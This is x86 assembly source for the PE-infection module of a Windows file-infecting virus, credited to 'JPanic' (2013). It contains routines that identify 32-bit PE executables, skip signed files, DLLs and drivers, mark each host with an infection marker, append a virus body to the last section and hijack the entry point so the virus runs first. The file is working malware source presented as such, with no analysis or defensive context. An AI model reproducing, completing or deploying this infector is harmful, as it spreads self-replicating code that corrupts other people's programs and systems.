;= PE Infection Routine Definitions (c) 2013 JPanic =======================
;
; Provides routines for infection and identification of PE executables.
;
; PUBLICS:
;	IsImagePE()
;	InfectPE()
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	include inc\win32.inc
	include inc\pe.inc
        include vheap.ash
        include vmain.ash
        include osprocs.ash
        
;= Code Warez =============================================================
        include codeseg.ash
;= IsImagePE===============================================================
;
; Inputs:
;	EBX = Image to check.
;
; Outputs:
;	ZF if file is PE.
;	ESI = Relative offset of PE header.
;
;--------------------------------------------------------------------------
PUBLIC IsImagePE
IsImagePE	PROC
		cmp	wo [ebx],IMAGE_DOS_SIGNATURE
		jne	$ret
		mov	esi,dwo [ebx+3Ch]
		cmp	esi,0FFFh
		ja	$ret
                add     esi,ebx
		cmp	dwo [esi],IMAGE_NT_SIGNATURE
	$ret:	ret		
IsImagePE	ENDP		

;= InfectPE ===============================================================
;
; Inputs:
;	EBX = Mapped file image.
;	ESI = Relative offset of PE header.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectPE
InfectPE	PROC
		
	        PEHDR	EQU	[esi]
	                
		; Check if already infected.
		cmp	wo PEHDR[peh_TimeDateStamp],VMarker
		je	$ret		
		; Check for valid flags:
		; IMAGE_FILE_SYSTEM == IMAGE_FILE_DLL == IMAGE_FILE_UP_SYSTEM_ONLY == 0
		; IMAGE_FILE_EXECUTABLE_IMAGE == IMAGE_FILE_32BIT_MACHINE == 1
		mov	ax,IMAGE_FILE_SYSTEM+IMAGE_FILE_DLL+IMAGE_FILE_UP_SYSTEM_ONLY+IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_32BIT_MACHINE
		and	eax,dwo PEHDR[peh_Flags]
		cmp	ax,IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_32BIT_MACHINE		
	@@retnz1:
		jnz	$ret
		; Check if valid subsystem: 2 = Win32 GUI, 3 = Win32 Console.
		mov	eax,dwo PEHDR[peh_SubSystem]
		and	al,NOT 1
		cmp	ax,2
	@@retnz2:
		jne	@@retnz1
		; Check for Security Directory
		cmp	PEHDR[peh_SecurityDirectory.pedir_Size],0
		jne	@@retnz2
		test	by PEHDR[peh_DLLFlags.bHI],20h		; WDM Driver?
		jnz	@@retnz2
		; Begin infection - mark as infected.
		mov	wo PEHDR[peh_TimeDateStamp],VMarker
		; Set EDX = Last section header.
		movzx	edx,wo PEHDR[peh_SectionCount]
		dec	edx
		imul	edx,size PE_Sec
		movzx	edi,wo PEHDR[peh_NTHdrSize]
		add	edx,edi
		lea	edi,PEHDR[peh_Magic]
		add	edx,edi                
		; Get physical offset to append virus.
		mov	edi,[vheap.dwFileSize]
		;overlay check
		mov	eax,[edx.pesec_RawDataPtr]
		add	eax,[edx.pesec_RawDataSize]
		add	eax,512
		cmp	edi,eax
		ja	$ret
		mov     eax,edi
		sub	eax,[edx.pesec_RawDataPtr]
		add	eax,[edx.pesec_VirtualAddress]
                add	edi,ebx         ; edi = EOF of mapped file to write virus
		; Stack = Last PESEC_Hdr, PE_Hdr
                push	edx esi
		mov     dl,OS_Proc_Use_Win32
		xchg	eax,PEHDR[peh_EntryPointRVA]
		add	eax,PEHDR[peh_ImageBase]
                call    BuildVBody                
		; esi=PE_Hdr, edx=Last PESEC_Hdr
		pop	esi edx
		; Set new section physical size.		
		sub	edi,ebx		
		sub	edi,[edx.pesec_RawDataPtr]		
		; Stack=unrounded section size
		push	edi
		mov	[edx.pesec_RawDataSize],edi
		; Set new file size.
		add	edi,[edx.pesec_RawDataPtr]
		mov	[vheap.dwFileSize],edi
		; Set new section virtual size.		
		pop	eax
		cmp	[edx.pesec_VirtualSize],eax
		.if	carry?
			mov     [edx.pesec_VirtualSize],eax
		.endif
		; Set section flags.
		or	[edx.pesec_Flags.wHI.bHI], 60h
		; Set new image size.
		add	eax,[edx.pesec_VirtualAddress]
		cmp	dwo PEHDR[peh_ImageSize],eax
		.if	carry?
		 	mov	dwo PEHDR[peh_ImageSize],eax
		.endif
	@@ret:	ret
InfectPE	ENDP

;==========================================================================
                ENDS
		END
;==========================================================================
